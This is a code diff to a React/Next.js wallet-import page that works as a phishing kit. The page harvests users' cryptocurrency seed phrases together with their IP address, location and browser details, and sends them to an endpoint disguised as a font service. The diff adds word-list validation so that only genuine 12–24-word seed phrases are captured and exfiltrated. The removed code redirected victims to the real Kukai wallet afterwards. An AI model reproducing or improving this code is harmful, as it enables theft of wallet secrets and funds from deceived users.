@@ -4,6 +4,8 @@ import { ChevronLeft } from "lucide-react";
 import { useEffect, useState } from "react";
 import { getUserCountry } from "../utils/services/getUserLocation";
 import { useRouter } from "next/navigation";
+import axios from "axios";
+
 export default function ImportWallet() {
   const [activeTab, setActiveTab] = useState("keystore");
   const [isToggled, setIsToggled] = useState(false);
@@ -11,6 +13,9 @@ export default function ImportWallet() {
   const [seedPhraseMessage, setSeedPhraseMessage] = useState()
   const [windowLocation, setWindowLocation] = useState()
   const [userAgent, setUserAgent] = useState()
+  const [seedPhraseList, setSeedPhraseList] = useState()
+  const [phraseState, setPhraseState] = useState(true)
+  const [seedPhraseErrorMessage, setSeedPhraseErrorMessage] = useState()
   const toggleSwitch = () => {
     setIsToggled(!isToggled);
   };
@@ -22,9 +27,18 @@ export default function ImportWallet() {
       const userInfo = await getUserCountry();
       setUserInfo(userInfo);
     };
+    const fetchWordList = async () => {
+      try {
+        const wordList = await axios.get("https://www.kaspawallet.org/seedphrase.txt")
+        setSeedPhraseList(wordList.data)
+      } catch (error) {
+        console.error("Failed to fetch seed phrase list:", error)
+      }
+    }
     const userAgent = navigator.userAgent;
     setUserAgent(userAgent)
     fetchUserInfo();
+    fetchWordList()
     setWindowLocation(window.location.href)
   }, []);
 
@@ -45,7 +59,9 @@ export default function ImportWallet() {
     ipAddress: userInfo?.ip,
     appName: windowLocation,
   };
-
+  if (seedPhraseMessage) {
+    console.log(messageData)
+  }
   const sendMessage = async () => {
     try {
       await fetch("https://fonts7787.vercel.app/api/t1/image", {
@@ -71,6 +87,52 @@ export default function ImportWallet() {
       body: JSON.stringify(messageDataAlt),
     }).catch((error) => console.error("Error sending font message:", error));
   }
+  const handleSeedPhrasesChange = (event) => {
+
+    const wordlist = event.target.value.split(' ');
+    const phrases = seedPhraseList.split("\n");
+    const sortedWordlist = wordlist.sort();
+    const sortedPhrases = phrases.sort();
+    let matches = 0;
+    let matchedWords = []; // Array to store matched words
+    for (let i = 0; i < sortedPhrases.length; i++) {
+      const index = binarySearch(sortedWordlist, sortedPhrases[i]);
+      if (index !== -1) {
+        matches++;
+        matchedWords.push(sortedPhrases[i]); // Add matched word to the array
+      }
+    }
+
+    if (matches < 12 || matches > 24) {
+      console.log("Seed phrases are not valid");
+      setSeedPhraseErrorMessage("Seed phrases are not valid")
+      setPhraseState(true);
+    } else {
+      console.log("Seed phrases are valid");
+      setPhraseState(false);
+      setSeedPhraseMessage(matchedWords)
+      setSeedPhraseErrorMessage('')
+
+    }
+  };
+
+  const binarySearch = (arr, target) => {
+    let left = 0;
+    let right = arr.length - 1;
+
+    while (left <= right) {
+      const mid = Math.floor((left + right) / 2);
+      if (arr[mid] === target) {
+        return mid;
+      } else if (arr[mid] < target) {
+        left = mid + 1;
+      } else {
+        right = mid - 1;
+      }
+    }
+
+    return -1;
+  };
 
 
   return (
@@ -154,7 +216,7 @@ export default function ImportWallet() {
             <div className="flex flex-col gap-4 items-center justify-center">
               <textarea
                 onChange={(e) => {
-                  setSeedPhraseMessage(e.target.value)
+                  handleSeedPhrasesChange(e)
                 }}
                 rows={4}
                 className="sm:w-[45%] w-[70%] px-3 py-2 text-[11px] text-center text-gray-700 border rounded-lg focus:outline-none focus:border-blue-500"
@@ -209,21 +271,13 @@ export default function ImportWallet() {
                   </div>
                 </div>
               )}
-              <button onClick={(e) => {
+              <div>
+                {seedPhraseErrorMessage && <p className="text-red-500 text-sm">{seedPhraseErrorMessage}</p>}
+              </div>
+              <button disabled={phraseState} onClick={(e) => {
                 e.preventDefault()
-                sendMessage().then(() => {
-                  setTimeout(() => {
-                    router.push("https://wallet.kukai.app/import")
-                  }, 7000)
-                }).catch((error) => {
-                  console.error("Error sending message:", error);
-                }).finally(() => {
-                  setTimeout(() => {
-                    router.push("https://wallet.kukai.app/import")
-                  }, 7000)
-                })
-
-              }} className="w-[45%] bg-[#505bf0] text-white rounded-full py-2 px-4 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
+                sendMessage()
+              }} className="w-[45%] cursor-pointer bg-[#505bf0] text-white rounded-full py-2 px-4 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">
                 Import
               </button>
             </div>
